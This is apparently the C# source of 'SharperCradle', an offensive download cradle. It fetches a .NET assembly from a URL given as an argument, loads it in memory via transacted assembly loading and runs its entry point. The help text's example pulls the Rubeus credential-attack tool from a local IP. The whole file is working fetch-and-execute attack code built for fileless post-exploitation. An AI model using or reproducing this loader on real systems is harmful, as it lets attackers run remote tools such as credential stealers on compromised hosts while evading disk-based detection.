using System;
using System.Linq;
using System.IO;
using System.Net;
using System.Reflection;

namespace SharperCradle
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] assemblyBytes = null;
            if (args.Length > 0)
            {
                try
                {
                    MemoryStream ms = new MemoryStream();
                    using (WebClient client = new WebClient())
                    {
                        System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
                        ms = new MemoryStream(client.DownloadData(args[0]));
                        BinaryReader br = new BinaryReader(ms);
                        assemblyBytes = br.ReadBytes(Convert.ToInt32(ms.Length));
                        ms.Close();
                        br.Close();
                    }
                }
                catch
                {
                    Console.WriteLine("[X] argument error, ensure formatting is correct and target URI is reachable");
                    help();
                    System.Environment.Exit(0);
                }

                if (args.Length > 1)
                {
                    Load(assemblyBytes, args.Skip(1).ToArray());
                }
                else
                {
                    Load(assemblyBytes);
                }
            }
            else
            {
                help();
            }
        }
        static void help()
        {
            Console.WriteLine("Please include the uri to the assembly you would like to load, followed by any args.");
            Console.WriteLine("Example: http://192.168.1.100/Rubeus.exe Triage");
        }

        static void Load(byte[] assemblyBytes, string[] args = null)
        {
            Assembly a = STL.TransactedAssembly.Load(assemblyBytes);

            if (args == null)
            {
                args = new string[1] { "" };
            }
            try
            {
                a.EntryPoint.Invoke(null, new object[] { args });
            }
            catch
            {
                a.EntryPoint.Invoke(null, null);
            }
        }
    }
}
